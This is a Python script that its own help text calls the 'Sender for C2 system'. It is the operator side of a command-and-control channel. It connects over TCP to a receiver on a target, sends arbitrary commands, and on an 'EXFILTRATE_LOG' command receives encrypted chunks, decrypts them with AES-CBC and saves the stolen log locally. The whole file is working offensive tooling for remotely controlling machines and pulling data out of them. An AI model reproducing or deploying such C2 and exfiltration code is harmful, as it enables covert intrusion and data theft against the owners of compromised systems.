import socket  # Import socket module for network communication
import argparse  # Import argparse to handle command-line arguments
from Crypto.Cipher import AES  # Import AES from PyCryptodome for encryption
from Crypto.Util.Padding import unpad  # Import padding utility for AES decryption


# Function to decrypt data using AES in CBC mode
def decrypt_data(encrypted_data, key):
    """Decrypt AES CBC encrypted data using the provided key."""
    if len(encrypted_data) < AES.block_size:
        print("❌ Error: Encrypted data is too short.")
        return b''

    iv = encrypted_data[:AES.block_size]  # Extract the first 16 bytes as IV
    ct = encrypted_data[AES.block_size:]  # Extract the remaining bytes as ciphertext
    cipher = AES.new(key, AES.MODE_CBC, iv)  # Create AES cipher object with CBC mode
    try:
        decrypted_data = unpad(cipher.decrypt(ct), AES.block_size)  # Decrypt and remove padding
        print(f"🔓 Decrypted data: {decrypted_data[:64]}... IV length: {len(iv)}, CT length: {len(ct)}")  # Debug output
        return decrypted_data
    except ValueError as e:  # Catch ValueError in case of padding errors
        print(f"❌ Padding error: {e}")
        return b''


# Function to send a command to the receiver and handle response
def send_command(command, destination_ip, destination_port, decrypt_key=None):
    """Send a command to the receiver and process the response."""
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:  # Create a TCP socket
        try:
            sock.connect((destination_ip, destination_port))  # Connect to the receiver
            print(f"📨 Sending command: {command}")
            sock.sendall(command.encode())  # Send the command as bytes

            if command == "EXFILTRATE_LOG":  # Special case for requesting log file
                with open('received_log.txt', 'wb') as f:
                    while True:
                        data = sock.recv(1400)  # Receive data in 1400-byte chunks
                        if data == b"EOF":  # End of file signal from the receiver
                            break
                        if decrypt_key:
                            data = decrypt_data(data, decrypt_key)  # Decrypt received data
                        if data:
                            f.write(data)  # Write decrypted data to file
                print("📩 Log file received successfully.")
            else:
                response = sock.recv(1024).decode()  # Receive response from receiver
                print(f"📩 Response from receiver: {response}")

        except Exception as e:
            print(f"❌ Error sending command: {e}")
        finally:
            sock.close()  # Close the socket connection


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Sender for C2 system")
    parser.add_argument("command", help="Command to send")  # Command to be executed
    parser.add_argument("destination_ip", help="Receiver IP address")  # Receiver IP
    parser.add_argument("destination_port", type=int, help="Receiver port")  # Receiver port
    parser.add_argument("--decryption_key", help="Hexadecimal AES decryption key (for EXFILTRATE_LOG)")
    args = parser.parse_args()

    decrypt_key = bytes.fromhex(args.decryption_key) if args.decryption_key else None  # Convert decryption key from hex
    send_command(args.command, args.destination_ip, args.destination_port, decrypt_key)  # Send the command
